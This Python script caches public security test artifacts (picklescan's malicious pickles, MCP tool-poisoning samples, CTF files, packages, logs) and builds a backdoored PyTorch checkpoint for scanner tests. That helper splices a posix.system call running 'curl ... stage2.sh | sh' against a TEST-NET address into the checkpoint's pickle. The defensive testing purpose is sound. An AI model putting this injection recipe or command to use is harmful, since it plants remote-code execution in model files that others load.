#!/usr/bin/env python3
"""The real-artifact cache of group d (toolkits ai_model_files, agent_trace, repo_supply_chain,
evidence_core, and solvers/common/classical.py): where it is, what is in it, how to refill it.

  .venv/bin/python tests/real/fetch_d.py            download what is missing, check every SHA-256,
                                                    write <cache>/<kit>/SOURCES.md
  .venv/bin/python tests/real/fetch_d.py --check    check only (no network); exit 1 on a miss
  .venv/bin/python tests/real/fetch_d.py --kit ai_model_files

The cache is <main checkout>/challenges/_realdata/ (untracked, never committed), or
$CTF_REALDATA. Nothing here talks to the Game Master or reads a token. Every file is public:
the two Huntress write-up repositories (challenge files of 2024 and 2025), the test corpora that
ship with public tools (picklescan's test pickles, numpy's own test arrays, loghub's log samples,
AgentDojo's saved runs), model files of a few megabytes from public hubs, and packages from their
registries. No live malware: picklescan's "malicious" pickles are scanner test vectors that print
a line or list a directory, and nothing in the cache is ever loaded, imported or run - the
toolkits read bytes, and the tests in this folder do the same.

A file whose upstream can move (a `main` branch, a store's "latest") has its hash recorded at the
first fetch; a later mismatch is reported and the cached copy is kept, so a test that pinned facts
of the old bytes still reads the old bytes.

For the tests of this folder:

  import fetch_d
  d = fetch_d.have("ai_model_files")        # the kit's folder, or None when it is not cached
  p = fetch_d.path("ai_model_files", "tiny-bert.safetensors")
"""
import hashlib
import io
import os
import shutil
import struct
import subprocess
import sys
import urllib.request
import zipfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent.parent
KITS = ("ai_model_files", "agent_trace", "repo_supply_chain", "evidence_core", "classical")

HF = "https://huggingface.co/"
GH = "https://raw.githubusercontent.com/"
PS = "https://github.com/mmaitre314/picklescan/raw/main/tests/data/"

# name: (url, sha256, bytes to take from the start or None, note)
URLS = {
    "ai_model_files": {
        "tiny-bert.safetensors": (HF + "hf-internal-testing/tiny-random-bert/resolve/main/model.safetensors", "", None, "safetensors, 100 tensors"),
        "tiny-bert-pytorch_model.bin": (HF + "hf-internal-testing/tiny-random-bert/resolve/main/pytorch_model.bin", "", None, "PyTorch zip checkpoint of the same model"),
        "tiny-distilbert-legacy.bin": (HF + "sshleifer/tiny-distilbert-base-cased/resolve/main/pytorch_model.bin", "", None, "PyTorch legacy (pre-1.6) checkpoint"),
        "tiny-gpt2.bin": (HF + "sshleifer/tiny-gpt2/resolve/main/pytorch_model.bin", "", None, "PyTorch legacy checkpoint"),
        "squeezenet1_1.torchscript.pt": (HF + "pepecalero/imagenet_torchscript/resolve/main/squeezenet1_1.pt", "", None, "TorchScript archive, 5 MB"),
        "stories260K.gguf": (HF + "ggml-org/models/resolve/main/tinyllamas/stories260K.gguf", "", None, "GGUF v3 with 48 tensors"),
        "ggml-vocab-phi-3.gguf": ("https://github.com/ggml-org/llama.cpp/raw/master/models/ggml-vocab-phi-3.gguf", "", None, "GGUF vocabulary file with a chat template"),
        "tinyllama-chat-q2k.head2m.gguf": (HF + "TheBloke/TinyLlama-1.1B-Chat-v1.0-GGUF/resolve/main/tinyllama-1.1b-chat-v1.0.Q2_K.gguf", "", 2097152,
                                           "the first 2 MiB of a 483 MB chat model: the whole header (metadata, chat template, 201 tensor infos), no tensor data"),
        "mnist-12.onnx": ("https://github.com/onnx/models/raw/main/validated/vision/classification/mnist/model/mnist-12.onnx", "", None, "ONNX, CNTK producer"),
        "sklearn_model.joblib": (HF + "julien-c/wine-quality/resolve/main/sklearn_model.joblib", "", None, "joblib pickle of a scikit-learn pipeline"),
        "keras-conv-mnist.h5": (HF + "osanseviero/keras-conv-mnist/resolve/main/tf_model.h5", "", None, "Keras 2 HDF5 model"),
        "fashion-mnist.keras": (HF + "sujivanasri/Fashion_online-mnist_keras_model/resolve/main/demo_model.keras", "", None, "Keras 3 zip"),
        **{f"ps-{n}": (PS + n, "", None, "picklescan test vector") for n in (
            "benign0_v0.pkl", "benign0_v3.pkl", "benign0_v4.pkl", "broken_model.pkl", "malicious0.pkl", "malicious1.zip",
            "malicious1_0x1.zip", "malicious1_central_directory.zip", "malicious1_v0.pkl", "malicious1_v3.pkl", "malicious1_v4.pkl",
            "malicious2_v0.pkl", "malicious2_v4.pkl", "malicious3.pkl", "malicious4.pickle", "malicious5.pickle", "malicious6.pkl",
            "malicious7.pkl", "malicious8.pkl", "malicious9.pkl", "malicious10.pkl", "malicious11.pkl", "malicious12.pkl",
            "malicious13a.pkl", "malicious13b.pkl", "malicious14.pkl", "malicious15a.pkl", "malicious15b.pkl", "malicious16.pkl",
            "malicious17.pkl", "malicious18.pkl", "malicious19.pkl", "malicious20.pkl", "new_pytorch_model.bin",
            "pytorch_magic_bypass.pt", "sys_module_override_sploit.pkl", "bad_pytorch.pt", "not_a_pickle.bin")},
    },
    "agent_trace": {
        **{f"agentdojo-{s}-{u}-{i}.json": (GH + f"ethz-spylab/agentdojo/main/runs/gpt-4o-2024-05-13/{s}/user_task_{u[2:]}/{a}/{f}.json", "", None,
                                           "AgentDojo saved run (its own `injections` and `security` fields are the ground truth)")
           for s, u, i, a, f in (("workspace", "ut0", "it0", "important_instructions", "injection_task_0"),
                                 ("banking", "ut0", "it0", "important_instructions", "injection_task_0"),
                                 ("slack", "ut1", "it1", "important_instructions", "injection_task_1"),
                                 ("workspace", "ut0", "none", "none", "none"))},
        "claude-code-log-representative.jsonl": (GH + "daaain/claude-code-log/main/test/test_data/representative_messages.jsonl", "", None, "Claude Code session JSONL (a viewer's test data)"),
        "toolsnap-create_issue.snap": (GH + "github/github-mcp-server/main/pkg/github/__toolsnaps__/create_issue.snap", "", None, "one MCP tool definition as a server ships it"),
        "servers-mcp.json": (GH + "modelcontextprotocol/servers/main/.mcp.json", "", None, "an mcp.json"),
        "invariant-direct-poisoning.py": (GH + "invariantlabs-ai/mcp-injection-experiments/main/direct-poisoning.py", "", None, "MCP tool poisoning sample (Python server source)"),
        "invariant-shadowing.py": (GH + "invariantlabs-ai/mcp-injection-experiments/main/shadowing.py", "", None, "MCP tool shadowing sample"),
        "invariant-whatsapp-takeover.py": (GH + "invariantlabs-ai/mcp-injection-experiments/main/whatsapp-takeover.py", "", None, "MCP rug pull: the docstring is swapped at run time"),
        "emoji-test.txt": ("https://unicode.org/Public/emoji/15.1/emoji-test.txt", "", None, "every emoji sequence: tag characters and ZWJ in benign use"),
        "wikipedia-prompt-injection.html": ("https://en.wikipedia.org/api/rest_v1/page/html/Prompt_injection", "", None, "a real web page: display:none furniture and 150 link titles"),
        "ocrmypdf-graph_ocred.pdf": (GH + "ocrmypdf/OCRmyPDF/main/tests/resources/graph_ocred.pdf", "", None, "an OCRed scan: its text layer is render mode 3"),
    },
    "repo_supply_chain": {
        "six-1.16.0-py2.py3-none-any.whl": ("https://files.pythonhosted.org/packages/d9/5a/e7c31adbe875f2abbb91bd84cf2dc52d792b5a01506781dbcf25c91daf11/six-1.16.0-py2.py3-none-any.whl", "", None, "wheel (sha256 as PyPI publishes it)"),
        "six-1.16.0.tar.gz": ("https://files.pythonhosted.org/packages/71/39/171f1c67cd00715f190ba0b100d606d440a28c93c7714febeca8b79af85e/six-1.16.0.tar.gz", "", None, "sdist"),
        "setuptools-68.0.0-py3-none-any.whl": ("https://files.pythonhosted.org/packages/c7/42/be1c7bbdd83e1bfb160c94b9cafd8e25efc7400346cf7ccdbdb452c467fa/setuptools-68.0.0-py3-none-any.whl", "", None, "wheel with a .pth file and four empty members"),
        "left-pad-1.3.0.tgz": ("https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz", "", None, "npm package, no install hook"),
        "husky-4.3.8.tgz": ("https://registry.npmjs.org/husky/-/husky-4.3.8.tgz", "", None, "npm package with install and postinstall hooks"),
        "rake-13.0.6.gem": ("https://rubygems.org/downloads/rake-13.0.6.gem", "", None, "gem"),
        "ant-launcher-1.10.14.jar": ("https://repo1.maven.org/maven2/org/apache/ant/ant-launcher/1.10.14/ant-launcher-1.10.14.jar", "", None, "jar with a Main-Class"),
        "jquery.1.9.1.nupkg": ("https://api.nuget.org/v3-flatcontainer/jquery/1.9.1/jquery.1.9.1.nupkg", "", None, "nupkg with Tools/install.ps1"),
        "editorconfig-0.18.2.vsix": ("https://open-vsx.org/api/EditorConfig/EditorConfig/0.18.2/file/EditorConfig.EditorConfig-0.18.2.vsix", "", None, "VS Code extension"),
        "labeler-workflow.yml": (GH + "ggml-org/llama.cpp/master/.github/workflows/labeler.yml", "", None, "a GitHub workflow on pull_request_target"),
        "google-docs-offline.crx": ("https://clients2.google.com/service/update2/crx?response=redirect&prodversion=131.0&acceptformat=crx3&x=id%3Dghbmnnjooekpmoecnnnilnnbdlolhkhi%26uc", "", None,
                                    "a CRX3 from the Chrome Web Store (the store serves its latest version: the hash is the first fetch's)"),
    },
    "evidence_core": {
        "OpenSSH_2k.log": (GH + "logpai/loghub/master/OpenSSH/OpenSSH_2k.log", "", None, "loghub sample, 2,000 sshd lines"),
        "OpenSSH_2k.log_structured.csv": (GH + "logpai/loghub/master/OpenSSH/OpenSSH_2k.log_structured.csv", "", None, "loghub's own parse of it: the independent count"),
        "Apache_2k.log": (GH + "logpai/loghub/master/Apache/Apache_2k.log", "", None, "loghub sample, Apache error log"),
        "Linux_2k.log": (GH + "logpai/loghub/master/Linux/Linux_2k.log", "", None, "loghub sample, syslog"),
        "access.log": (GH + "elastic/examples/master/Common%20Data%20Formats/apache_logs/apache_logs", "", None, "10,000 lines of a real combined access log"),
        "Chinook_Sqlite.sqlite": ("https://github.com/lerocha/chinook-database/raw/master/ChinookDatabase/DataSources/Chinook_Sqlite.sqlite", "", None, "the Chinook sample database"),
        "nmap_example.xml": (GH + "nmap/nmap/master/zenmap/radialnet/share/sample/nmap_example.xml", "", None, "an nmap XML report"),
    },
    "classical": {},
}

# Files and folders taken out of the write-up repositories: kit -> {name: (repository, path inside it, note)}
REPOS = {
    "Huntress-CTF-2024": "https://github.com/ThisGuyNeedsABeer/Huntress-CTF-2024",
    "CTF-Huntress_2025": "https://github.com/TheGroundZero/CTF-Huntress_2025",
    "test_keys": "https://github.com/trufflesecurity/test_keys",        # a small repository of fake secrets, cloned whole (its history is the test)
}
FULL_CLONE = ("test_keys",)
FROM_REPOS = {
    "repo_supply_chain": {
        "ancient.fossil": ("Huntress-CTF-2024", "forensics/ancient_fossil_COMPLETED/ancient.fossil", "2024 Ancient Fossil: a Fossil repository; flag in the write-up's flag.txt"),
        "darcy": ("CTF-Huntress_2025", "day20/darcy", "2025 Darcy: a darcs repository (folder); flag in 1_Darcy_COMPLETED.md"),
        "Splunk_TA_windows.zip": ("Huntress-CTF-2024", "forensics/backdoored_splunk_ii_COMPLETED/Splunk_TA_windows.zip", "2024 Backdoored Splunk II: an app with its own hash manifest"),
        "test_keys": ("test_keys", "", "a real git repository (pack, refs, a remote branch) with fake secrets in its history"),
    },
    "agent_trace": {
        "the_void-output.txt": ("Huntress-CTF-2024", "warmups/the_void_COMPLETED/output.txt", "2024 The Void: 12 MB of black-on-black terminal output"),
    },
    "evidence_core": {
        "webshellz-HTTP.log": ("CTF-Huntress_2025", "day22/webshellz/HTTP.log", "2025 Webshellz: an IIS W3C log"),
        "trashcan-rbc_log2.csv": ("CTF-Huntress_2025", "day11/rbc_log2.csv", "2025 Trashcan: the author's semicolon-separated table of $I records"),
    },
    "classical": {
        "cattle": ("Huntress-CTF-2024", "warmups/cattle_COMPLETED/cattle", "2024 Cattle: a COW program; flag in flag.txt"),
    },
}
# numpy ships these with its tests (object arrays written by Python 2): copied from the venv
NUMPY = ("lib/tests/data/py2-objarr.npy", "lib/tests/data/py2-np0-objarr.npy", "lib/tests/data/py2-objarr.npz", "_core/tests/data/astype_copy.pkl")

SHA256 = {
    # filled by `fetch_d.py --hashes` (the block below is machine-written; keep it sorted)
    # BEGIN SHA256
    "agent_trace/agentdojo-banking-ut0-it0.json": "775b172d3725b43dfc624aa296dc06b51fc953d40a17f0ea409490f6ad2f3b16",
    "agent_trace/agentdojo-slack-ut1-it1.json": "b23aec4ed55cceb41c8d5706277ebd0846c428d4b504449934365bd124aa1573",
    "agent_trace/agentdojo-workspace-ut0-it0.json": "bd52844eb7e8b9e54a0f516a3618d63476e8d419b205e761aa09ab1c2a81be50",
    "agent_trace/agentdojo-workspace-ut0-none.json": "8158688f12ef540e9b430ebe6390e434a0847408f0db8e978d606e540cde25d2",
    "agent_trace/claude-code-log-representative.jsonl": "3d3dce9df1ba29f171a1086b118702306cbaebfd125850d86272b07bd5908797",
    "agent_trace/emoji-test.txt": "d876ee249aa28eaa76cfa6dfaa702847a8d13b062aa488d465d0395ee8137ed9",
    "agent_trace/invariant-direct-poisoning.py": "a3701a430470b8c1819f25d8cb479d4856c19541999e6b8076e1179046865dce",
    "agent_trace/invariant-shadowing.py": "eb74d590aad025427112ec29d2d6f839219208ee2bd7f463f4ecb0d0f8874834",
    "agent_trace/invariant-whatsapp-takeover.py": "8e423c70b09dddce6091bef4179597fd14fba2d289780d7ae11c2385310c265d",
    "agent_trace/ocrmypdf-graph_ocred.pdf": "36784b0f8a37f124c7015a68c53d732b07519c30aa1b333e7ec1ba8a69cb6120",
    "agent_trace/servers-mcp.json": "b0f0b8ea0d6c6e4bd9d19270db8c4ed13a951c6a7d8fa9a7b76d0d12ddd2491f",
    "agent_trace/the_void-output.txt": "a09ef565c5bc616377ad5578845fb33d9ec81f48342f920fafc562b64faa6d3b",
    "agent_trace/toolsnap-create_issue.snap": "d6a6e3b53b31dbb42e5c59cb09f4247855d1c6be63d5dcb6ec423bb33b003e89",
    "agent_trace/wikipedia-prompt-injection.html": "ab158b636b90a019b4b59c4008f8ad1b8bce0600594463e937fe3b6391228d74",
    "ai_model_files/astype_copy.pkl": "9564b309cbf3441ff0a6e4468fddaca46230fab34f15c77d87025a455bdf59d9",
    "ai_model_files/built-backdoored-tiny-bert.bin": "12fa93789b2020d2fbe02309e3f4250b415fae01bc57084dff4c57a2ed8bf1a3",
    "ai_model_files/fashion-mnist.keras": "ea8d98343b6175dbee927d2638698bb0fd55ef497dfb10b211fa355c4b77e517",
    "ai_model_files/ggml-vocab-phi-3.gguf": "967d7190d11c4842eab697079d98d56c2116e10eb617be355a2733bfc132e326",
    "ai_model_files/keras-conv-mnist.h5": "331f95518683132a476d6f75d245b7d61a31de50d3654b1b21fa8b75f105c4be",
    "ai_model_files/mnist-12.onnx": "5c688690f8bacf667d4c2074af5ad0646ca328d7ab03eccf944a65b320171bdd",
    "ai_model_files/ps-bad_pytorch.pt": "4c4b6a3be1314ab86138bef4314dde022e600960d8689a2c8f8631802d20dab6",
    "ai_model_files/ps-benign0_v0.pkl": "a4ea14c22430620f19ab56c532ee54ac33848211c50544d4aaba586568f3b07e",
    "ai_model_files/ps-benign0_v3.pkl": "56d0df45e11789545336224e76601a3f063a303bd474a5035afc5a3b0e6aec1a",
    "ai_model_files/ps-benign0_v4.pkl": "b5103a701e335cabbb11a20d5a5b9ad15457a39f083bf79c4fc66fd347d2e4ee",
    "ai_model_files/ps-broken_model.pkl": "9b090cf6dc7582c7c5ad47c00b7575eb143ed49d98d118368bbe850eeb89b00a",
    "ai_model_files/ps-malicious0.pkl": "4afa15451e18b5bb1566f7b5b30c1eb8ed250ae8143fecc3779efb34230fe49f",
    "ai_model_files/ps-malicious1.zip": "7d3dcc04ae0b6ffb4618ac4ad97bbee407239028aa0982783ad470caa3a2478d",
    "ai_model_files/ps-malicious10.pkl": "4915a143e57179c659c8335e21748fcf18a6ff686dac486055510afd78424e1d",
    "ai_model_files/ps-malicious11.pkl": "4bac393350c4fd6114e554593c80f93f07345282c11eac0ecfd1ae8b35e782ff",
    "ai_model_files/ps-malicious12.pkl": "8530b3dbc2ae0a6dca17a9cb7c8acbab1a55f43812fc97f578e49312d0ffab7b",
    "ai_model_files/ps-malicious13a.pkl": "e819eae9666474c61b1dd42e26154834c2d0236564d1679f3f8485b88bb44624",
    "ai_model_files/ps-malicious13b.pkl": "a1d4ff050fb28aea5dee5f40de01c88f6dc9121855fb9fb86a02c43408d737bb",
    "ai_model_files/ps-malicious14.pkl": "9ea5ce608642933ffb895b7e354beb8d939563ad894cb11e2a44ffea3cc2e55d",
    "ai_model_files/ps-malicious15a.pkl": "2f6fed8304939800ff7799c8b3b2a26e6e41f258727aa12096fb5f588a260133",
    "ai_model_files/ps-malicious15b.pkl": "e5702d8bec9a64e347ec3bd308be0d4bacd02de53bf7eac1a1b47ad66b8c5bc8",
    "ai_model_files/ps-malicious16.pkl": "671ac416077641eeb682f74baa6fb6a90e3bf2b0fe2a59e90f46119162319847",
    "ai_model_files/ps-malicious17.pkl": "e608925029d3ea2babc30a2f4b6a4db15c2e1c14a2b1259119499c8e660d77ad",
    "ai_model_files/ps-malicious18.pkl": "8b02be522b0ec893cf9d1a54cd311a4d15195f71c9d082b1a2e700727e580856",
    "ai_model_files/ps-malicious19.pkl": "feb9acbcc362797cd56203bdce20760186d62ae2b68c407d4caaac66faa711e3",
    "ai_model_files/ps-malicious1_0x1.zip": "21a4ef24314ff07324a7ba2379572e5bd4804781ba039d7a57656b7dd7b7ff80",
    "ai_model_files/ps-malicious1_central_directory.zip": "1a80c2d58a33992364430c229b6ce1e1762a64ead2931db0c31960fe6bf659dd",
    "ai_model_files/ps-malicious1_v0.pkl": "cb0829232649140114fdbe5700a1e5d2768c7f94b5917220905d9c7045a271f7",
    "ai_model_files/ps-malicious1_v3.pkl": "e37284d4fc97a08e54b04037a0905e8c3cb70cedfc689f5d9465854ce50545b9",
    "ai_model_files/ps-malicious1_v4.pkl": "5d8763993fc5d724bedd06a1c56ce329ec29f0c05c3e0b6b69999045add63e8a",
    "ai_model_files/ps-malicious20.pkl": "e6940532c943948118e0a4eaf2cbd1d2a6f14070154ce59e2394287ee320c62c",
    "ai_model_files/ps-malicious2_v0.pkl": "d8f419be6dad5fcab18c97533e8c76675cb6123df9ddf3ac708a42934c87b833",
    "ai_model_files/ps-malicious2_v4.pkl": "64a3680e510699658704ff29693688e732988be7228814f109933f2b493c3ad1",
    "ai_model_files/ps-malicious3.pkl": "51679dbb09de3fba2880e2f8b62d4d4b850aad95ffba17bb90de945a7568a936",
    "ai_model_files/ps-malicious4.pickle": "7642e222dd0760e78ad9e705a752136d0b70953c27575931933a163fa3108d8a",
    "ai_model_files/ps-malicious5.pickle": "fb3ec2eb31f849377f5d8088c0c3665fb8bdfe01a5fd47465e1747b3bd643c9c",
    "ai_model_files/ps-malicious6.pkl": "d3dcd9f1f89d50fcf4ce6e50dcb59a78d64c386eb320fbf18bcbb9b3de05b110",
    "ai_model_files/ps-malicious7.pkl": "6860c76a4e8bda4912102bab9fc838e739783ca461e3638fa3ec6318505d0c28",
    "ai_model_files/ps-malicious8.pkl": "d83261c263d6970bc46f904c9a0cab96e6e0f5d80f3ec36a181cabda8f007b66",
    "ai_model_files/ps-malicious9.pkl": "2265909c5f683e65a532425550952ea35f8b7c2e52ef34943aa2e4c31a85b858",
    "ai_model_files/ps-new_pytorch_model.bin": "bcdadbfe42e52ffd38737dd6322468d00f4574f30d25555170861518c5a7b0a3",
    "ai_model_files/ps-not_a_pickle.bin": "b539a8bd7e7f0562080b96822c64df8b3d820d34c398c7e8604b67d82757b3df",
    "ai_model_files/ps-pytorch_magic_bypass.pt": "665fd43c051d45d8a2b40bf76a0ded06a7587f15af75e1081bd1bd5de6f988ed",
    "ai_model_files/ps-sys_module_override_sploit.pkl": "cdb7564de44b640d741f117a615f0b5b7eca028ddb5e69084ea20ee7413f35f7",
    "ai_model_files/py2-np0-objarr.npy": "64ba08ecade24295c392ea03175626c9ce896f0e099e06d0282f60adab9546c9",
    "ai_model_files/py2-objarr.npy": "178732502fbf4c1f504852c0a3673b738e2b0ba35460882b7c6c7d3ea58f48a9",
    "ai_model_files/py2-objarr.npz": "c68d771c14f415b159daabd9cf42d61836f74ae40049269787baca7d57098f1e",
    "ai_model_files/sklearn_model.joblib": "f163e61594190915171651609102ecf30a4dfa23a140f6d28cfa8f06dbda6952",
    "ai_model_files/squeezenet1_1.torchscript.pt": "d5a3efb594dbbfa36c5d04044a8fcfd935ff675a2e795ae8d8467aed1b1c9bd9",
    "ai_model_files/stories260K.gguf": "270cba1bd5109f42d03350f60406024560464db173c0e387d91f0426d3bd256d",
    "ai_model_files/tiny-bert-pytorch_model.bin": "9922e8996d0c7e24c7f4e7a5d9c5b7303549f4ee94de0f1138b103014b51be13",
    "ai_model_files/tiny-bert.safetensors": "965f02b6a7e5520fc12f710e4e3b6132f697f1c8f648819553c5ade86752d2de",
    "ai_model_files/tiny-distilbert-legacy.bin": "fa18ca3cf53c2c5f742d17023ad88941107ec151ff2bca567b87fcbd70f21308",
    "ai_model_files/tiny-gpt2.bin": "b706b24034032bdfe765ded5ab6403d201d295a995b790cb24c74becca5c04e6",
    "ai_model_files/tinyllama-chat-q2k.head2m.gguf": "3e378d9538adb78cb1013259c64b3c8bd0b0992c716b1183787e2ebedbb3bffe",
    "classical/cattle": "105e4572d5ec784cef666e52b45c120fab46985539df2373c49f9c684ac7cc93",
    "evidence_core/Apache_2k.log": "c7efa3eb686e3a96bd2f8f4457b2a7887e9cf2f3649327f1b4e87af841363ce8",
    "evidence_core/Chinook_Sqlite.sqlite": "7651ba378ac2fcd0dfc3c66fb101f7a7eed3ba39a612ec642b96e20702061f15",
    "evidence_core/Linux_2k.log": "b3e20bc1afe732ab1bf3ed1de4bf9c809e4194e02f7dea911d918e5342e8e173",
    "evidence_core/OpenSSH_2k.log": "1e4912727fa88245113d41b16a0cd25ceadba7f931e1c406542885b91254264f",
    "evidence_core/OpenSSH_2k.log_structured.csv": "c0996a11545f4b94b435993760afa441a9e373f7bfc9e787afdb8e62f65acb4f",
    "evidence_core/access.log": "f15c31e905f86c7b4b6ab44aee74d0a2086dce89f010187d983edea7ef0364ef",
    "evidence_core/nmap_example.xml": "ad1a768ee1d00a641314feafc9a9f27dcbaab94f5e6e11f5624db7023d07274b",
    "evidence_core/trashcan-rbc_log2.csv": "d9d255987c5fe22f757f3011e12574cf1b15905147f4531c3c26da45f73b2b67",
    "evidence_core/webshellz-HTTP.log": "1a3b27199605a4d75843b17b85602c572cbf0908be944ba0164656794c6c6457",
    "repo_supply_chain/Splunk_TA_windows.zip": "b9df4ead3339526a3bf5663c89fee952981b38e979380887dd988329a625f500",
    "repo_supply_chain/ancient.fossil": "9823ce3955d38abe999085ea5384330a6c6280f43a634afff5782d478de4aad6",
    "repo_supply_chain/ant-launcher-1.10.14.jar": "f0909725a7a24e393888f3fbb558347abf506ce2f7ebc581ff26331b94d951a5",
    "repo_supply_chain/darcy": "329ffec99fe481131a67ce732c3c0cbff957e8facf1f1c7f50080084702f6237",
    "repo_supply_chain/editorconfig-0.18.2.vsix": "cbc0370ff204bc16d84a3ee6830536fc04355856fa0e895ab064e1a03cfcb84a",
    "repo_supply_chain/google-docs-offline.crx": "e03138d37406c2bedec93e5a7c44a457a6b19cf4fee5dfe5a46450fcea1bf85e",
    "repo_supply_chain/husky-4.3.8.tgz": "31c906d23034788e7ecfff721176879c70ca4d14dd606249fbd4f4e9ed542e37",
    "repo_supply_chain/jquery.1.9.1.nupkg": "3e8cbb2359c3db262793c52f40a0612535fd4972a81f94cc4bf98795c060bc2b",
    "repo_supply_chain/labeler-workflow.yml": "5ec90ff70173ab73621f9b2018d373fcc4f457ca721ea30905c4852c6e3bde5a",
    "repo_supply_chain/left-pad-1.3.0.tgz": "870c0fe1096223a58d4f8832d08a7e651ea2fcadb8e6877b2fdc26b662d481dd",
    "repo_supply_chain/rake-13.0.6.gem": "5ce4bf5037b4196c24ac62834d8db1ce175470391026bd9e557d669beeb19097",
    "repo_supply_chain/setuptools-68.0.0-py3-none-any.whl": "11e52c67415a381d10d6b462ced9cfb97066179f0e871399e006c4ab101fc85f",
    "repo_supply_chain/six-1.16.0-py2.py3-none-any.whl": "8abb2f1d86890a2dfb989f9a77cfcfd3e47c2a354b01111771326f8aa26e0254",
    "repo_supply_chain/six-1.16.0.tar.gz": "1e61c37477a1626458e36f7b1d82aa5c9b094fa4802892072e49de9c60c4c926",
    "repo_supply_chain/test_keys": "5f663e4392e7027f680c093d5546feaaee45e7ec5c799db9b57976135b240711",
    # END SHA256
}


def cache() -> Path:
    """The corpus root: ctf.paths.realdata_root() ($CTF_REALDATA)."""
    sys.path.insert(0, str(Path(__file__).resolve().parent))
    import _corpus
    return _corpus.root()


def have(kit: str):
    """The kit's cache folder when it exists and is not empty, else None (the tests then SKIP)."""
    d = cache() / kit
    return d if d.is_dir() and any(d.iterdir()) else None


def path(kit: str, name: str):
    """One cached file or folder, or None when it is not there."""
    p = cache() / kit / name
    return p if p.exists() else None


def sha256_of(p: Path) -> str:
    if p.is_dir():                  # a folder: the hash of its sorted (relative path, file hash) lines
        h = hashlib.sha256()
        for f in sorted(x for x in p.rglob("*") if x.is_file() and ".git/" not in str(x.relative_to(p)) + "/"):
            h.update(f"{f.relative_to(p).as_posix()}\0{hashlib.sha256(f.read_bytes()).hexdigest()}\n".encode())
        return h.hexdigest()
    return hashlib.sha256(p.read_bytes()).hexdigest()


def skip(script: str, kit: str) -> int:
    print(f"SKIP {script}: no real-artifact cache for {kit} under {cache()} (run tests/real/fetch_d.py)")
    return 0


# ---- built here: a backdoored copy of a real checkpoint -------------------------------------------------

PAYLOAD_CMD = "curl -s http://198.51.100.23:8443/stage2.sh | sh"       # TEST-NET-2: goes nowhere, and nothing ever runs it


def backdoor_checkpoint(clean: bytes) -> bytes:
    """A real PyTorch zip checkpoint with a reduce payload spliced into its data.pkl, the way fickling
    injects one: PROTO 2, posix.system(PAYLOAD_CMD), POP, then the original pickle body. Assembled
    opcode by opcode; nothing is pickled, unpickled or run."""
    src = zipfile.ZipFile(io.BytesIO(clean))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as dst:
        for info in src.infolist():
            body = src.read(info)
            if info.filename.endswith("data.pkl"):
                assert body[:2] == b"\x80\x02", "the checkpoint's pickle is protocol 2"
                cmd = PAYLOAD_CMD.encode()
                call = b"cposix\nsystem\n" + b"X" + struct.pack("<I", len(cmd)) + cmd + b"\x85R0"
                body = body[:2] + call + body[2:]
            z = zipfile.ZipInfo(info.filename, date_time=(2026, 10, 8, 0, 0, 0))
            dst.writestr(z, body)
    return out.getvalue()


# ---- fetching -------------------------------------------------------------------------------------------

def _get(url: str, first=None) -> bytes:
    headers = {"User-Agent": "curl/8"}
    if first:
        headers["Range"] = f"bytes=0-{first - 1}"
    with urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=180) as r:
        return r.read()


def _clone(name: str, url: str, root: Path, log) -> bool:
    dest = root / "repos" / name
    if dest.is_dir():
        return True
    tmp = root / "repos" / f".tmp-d-{name}-{os.getpid()}"
    tmp.parent.mkdir(parents=True, exist_ok=True)
    cmd = ["git", "clone", "-q"] + ([] if name in FULL_CLONE else ["--depth", "1"]) + [url, str(tmp)]
    try:
        subprocess.run(cmd, check=True, timeout=900)
    except (OSError, subprocess.SubprocessError) as e:
        log(f"FAIL clone {url}: {e}")
        shutil.rmtree(tmp, ignore_errors=True)
        return False
    if dest.is_dir():               # another group cloned it meanwhile
        shutil.rmtree(tmp, ignore_errors=True)
    else:
        tmp.rename(dest)
    return True


def fetch(kits=KITS, check_only=False, log=print) -> tuple:
    """(rows, problems): rows are (kit, name, sha256, size, source, note) of what is in the cache."""
    root = cache()
    rows, problems = [], []
    for kit in kits:
        d = root / kit
        if not check_only:
            d.mkdir(parents=True, exist_ok=True)
        for name, (url, _, first, note) in sorted(URLS.get(kit, {}).items()):
            p = d / name
            if not p.exists():
                if check_only:
                    problems.append(f"{kit}/{name}: not cached")
                    continue
                try:
                    data = _get(url, first)
                except Exception as e:      # noqa: BLE001
                    problems.append(f"{kit}/{name}: {type(e).__name__}: {e}")
                    continue
                want = SHA256.get(f"{kit}/{name}")
                if want and hashlib.sha256(data).hexdigest() != want:
                    problems.append(f"{kit}/{name}: upstream changed (sha256 {hashlib.sha256(data).hexdigest()}, pinned {want}); not cached")
                    continue
                p.write_bytes(data)
            got = sha256_of(p)
            want = SHA256.get(f"{kit}/{name}")
            if want and got != want:
                problems.append(f"{kit}/{name}: sha256 {got} is not the pinned {want}")
            rows.append((kit, name, got, p.stat().st_size, url + (f" (first {first} bytes)" if first else ""), note))
        for name, (repo, inside, note) in sorted(FROM_REPOS.get(kit, {}).items()):
            p = d / name
            if not p.exists():
                if check_only:
                    problems.append(f"{kit}/{name}: not cached")
                    continue
                if not _clone(repo, REPOS[repo], root, problems.append):
                    continue
                src = root / "repos" / repo / inside
                if not src.exists():
                    problems.append(f"{kit}/{name}: {repo}/{inside} is not in the clone")
                    continue
                # an APFS clone when the file system has them (cp -c), else a plain copy
                r = subprocess.run(["cp", "-cR", str(src), str(p)], capture_output=True)
                if r.returncode != 0:
                    (shutil.copytree if src.is_dir() else shutil.copy2)(str(src), str(p))
            got = sha256_of(p)
            want = SHA256.get(f"{kit}/{name}")
            if want and got != want:
                problems.append(f"{kit}/{name}: sha256 {got} is not the pinned {want}")
            size = sum(f.stat().st_size for f in p.rglob("*") if f.is_file()) if p.is_dir() else p.stat().st_size
            rows.append((kit, name, got, size, f"{REPOS[repo]} : {inside or '(the whole clone)'}", note))
        if kit == "ai_model_files":
            try:
                import numpy
                base = Path(numpy.__file__).parent
            except ImportError:
                base = None
            for rel in NUMPY:
                p = d / Path(rel).name
                if not p.exists() and base is not None and (base / rel).is_file() and not check_only:
                    shutil.copy2(base / rel, p)
                if p.exists():
                    rows.append((kit, p.name, sha256_of(p), p.stat().st_size, f"numpy {rel} (shipped in the wheel)", "numpy's own test data"))
                else:
                    problems.append(f"{kit}/{p.name}: not cached")
            clean, bad = d / "tiny-bert-pytorch_model.bin", d / "built-backdoored-tiny-bert.bin"
            if clean.exists() and not bad.exists() and not check_only:
